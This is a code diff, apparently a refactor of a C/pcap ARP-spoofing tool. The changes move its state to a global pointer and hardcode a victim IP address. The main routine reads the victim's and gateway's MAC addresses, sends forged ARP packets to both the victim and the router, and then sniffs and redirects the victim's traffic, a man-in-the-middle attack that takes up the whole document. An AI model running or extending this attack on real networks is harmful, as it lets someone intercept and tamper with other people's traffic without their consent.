@@ -1,12 +1,13 @@
 #include "myHeader.h"
 
+PLANINFO LanInfo;
+
 int main()
 {
-	LANINFO LanInfo;
 	pcap_if_t *alldevs, *choiceDev;
 	pcap_t* handle;
 	char errbuf[PCAP_ERRBUF_SIZE];
-	char victimIP[16];
+	char victimIP[16] = "192.168.50.135";
 
 	/* Retrieve the device list from the local machine */
 	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
@@ -23,38 +24,38 @@ int main()
 		exit(1);
 	}
 	/* now, we don't need any more the devices list */
-	pcap_freealldevs(alldevs);
 	memset(&LanInfo, 0, sizeof(LanInfo));
+	LanInfo = (PLANINFO)malloc(sizeof(LANINFO));
 	/* Input victim's IP */
-	printf("input victim's ip : ");
-	scanf("%s", victimIP);
+	//printf("input victim's ip : ");
+	//scanf("%s", victimIP);
 	/* find Device's GateWay IP address */
-	getGateWayAddress(choiceDev, &LanInfo);
-	LanInfo.victimIP.S_un.S_addr = inet_addr(victimIP);
-	getMACAddress(handle, &LanInfo);
+	getGateWayAddress(choiceDev);
+	LanInfo->victimIP.S_un.S_addr = inet_addr(victimIP);
+	getMACAddress(handle);
 	printf("victim MAC : ");
 	for (int i = 0; i < 6; i++)
 	{
 		if (i == 5)
-			printf("%.2X\n", LanInfo.victimMAC[i]);
+			printf("%.2X\n", LanInfo->victimMAC[i]);
 		else
-			printf("%.2X-", LanInfo.victimMAC[i]);
+			printf("%.2X-", LanInfo->victimMAC[i]);
 	}
 	printf("Gateway MAC : ");
 	for (int i = 0; i < 6; i++)
 	{
 		if (i == 5)
-			printf("%.2X\n", LanInfo.gatewayMAC[i]);
+			printf("%.2X\n", LanInfo->gatewayMAC[i]);
 		else
-			printf("%.2X-", LanInfo.gatewayMAC[i]);
+			printf("%.2X-", LanInfo->gatewayMAC[i]);
 	}
 	/* send fake arp packet */
 	ARP_PACKET arpPacket;
 	arpPacket.ethernet.etherType = ntohs(ARP);
 	setArpHeader(&arpPacket.arp);
-	attackvictim(handle, &arpPacket, &LanInfo);
+	attackvictim(handle, &arpPacket);
 	Sleep(500);
-	attackRouter(handle, &arpPacket, &LanInfo);
+	attackRouter(handle, &arpPacket);
 	/* sniff packet */
 	struct pcap_pkthdr* header;
 	const u_char* packet;
@@ -63,12 +64,14 @@ int main()
 	{
 		if (pcap_next_ex(handle, &header, &packet) == 1)
 		{
-			if (checkARP(handle, packet, &LanInfo))
+			if (checkARP(handle, packet))
 				continue;
 			else
-				packetRedirect(handle, header, packet, &LanInfo);
+				packetRedirect(handle, header, packet);
 		}
 	}
+	pcap_freealldevs(alldevs);
 	pcap_close(handle);
+	free(LanInfo);
 	return 0;
 }
